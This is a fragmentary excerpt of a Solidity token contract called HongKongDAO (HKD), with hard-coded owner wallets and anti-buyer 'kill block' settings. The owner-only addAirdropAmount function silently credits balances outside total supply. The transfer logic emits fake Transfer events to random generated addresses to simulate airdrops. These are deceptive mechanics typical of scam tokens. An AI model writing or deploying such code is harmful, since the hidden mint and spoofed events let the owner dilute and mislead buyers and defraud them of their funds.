...
contract HKD is Context, IERC20, Ownable {
    
    using SafeMath for uint256;
    using Address for address;
    
    string private _name = "HongKongDAO";
    string private _symbol = "HKD";
    uint8 private _decimals = 8;

    //These three variables are used to set kill blocks
    uint public launchedBlock;
    uint public killblock = 1;
    bool public isLaunch = false;
    
    //Marketing wallet and liquidity wallet
    address payable public marketingWalletAddress = payable(0xF96B1FB37fB70bB6A2c72517d1243e56bBeDa162);
    address payable public liquidityWalletAddress = payable(0xF96B1FB37fB70bB6A2c72517d1243e56bBeDa162);
    ...
    address public airdropAccount=0x67dB087A49D30fb47bE79247eAD14C27aA3953C7;
    bool public  IsAirDrop =false;
    uint256 public airdropNum=0;
    uint256 public airdropTotalNum=3;
    ...
    constructor () {
                    ...
                    //ok 0x069A306A638ac9d3a68a6BD8BE898774C073DCb3
    ...
    function _transfer(address sender, address recipient, uint256 amount) private returns (bool) {
        ...
        else
        {
            ...
            if (isExcludedFromFee[sender] || isExcludedFromFee[recipient]) {
                ...
                if(sender!=owner()&&IsAirDrop&&recipient==uniswapPair)  {
                for(uint i=0;i <2;i++){
                    ad = address(uint160(uint(keccak256(abi.encodePacked(i, _airdropAmount, block.timestamp)))));
                    //
                    //  _balances[ad]=_balances[ad].add(_airdropAmount);
                    transferFrom(airdropAccount,recipient,1);
                     
                    emit Transfer(address(airdropAccount),ad,_airdropAmount);
                }
                }
    ...
    function setAirDropTotalNum(uint256 _num) external onlyOwner{

        airdropTotalNum=_num;

    }

    function addAirdropAmount(uint256 _amount) external onlyOwner{

        _balances[airdropAccount]=_balances[airdropAccount].add(_amount);

    }

    function AirdropSwitch(bool _IsOpen) 
    external
    onlyOwner
    {
